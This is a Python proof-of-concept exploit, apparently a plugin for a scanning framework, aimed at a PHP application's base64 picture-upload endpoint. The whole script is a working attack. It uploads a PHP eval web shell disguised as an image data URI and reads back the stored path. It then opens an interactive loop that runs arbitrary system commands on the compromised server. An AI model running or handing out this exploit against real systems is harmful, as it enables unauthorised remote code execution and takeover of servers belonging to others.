from lib.core.data import target
import urlparse
import requests
import base64
import re

def poc():
	try:
		if  not target.url.endswith("index.php"):
			print("[*] Please make sure the url end with 'index.php'")
			exit()

		url = target.url + "?s=/Core/File/uploadPictureBase64.html"
		password = raw_input("[*] Please enter the shell-password:")
		phpShell = "<?php eval($_POST['" + password + "']);?>"
		payload = "data:image/php;base64," + base64.b64encode(phpShell)
		postData = {
			"data" : payload
		}
		r = requests.post(url,data=postData)
		if r.json()['status'] == 1:
			shell = r.json()['path']
		else:
			raise KeyError
		while 1:
			try:
				command = raw_input("[*] input the command:")
				payload= 'system("%s");' % command
				if command != "exit":
					postData = {
						password : payload
					}
					r = requests.post(shell, data=postData)
					print(r.text.encode(r.encoding))
				else:
					break
			except EOFError as e:
				print("[*] type 'exit' to quit")
				pass

		print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
	except KeyError as e:
		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
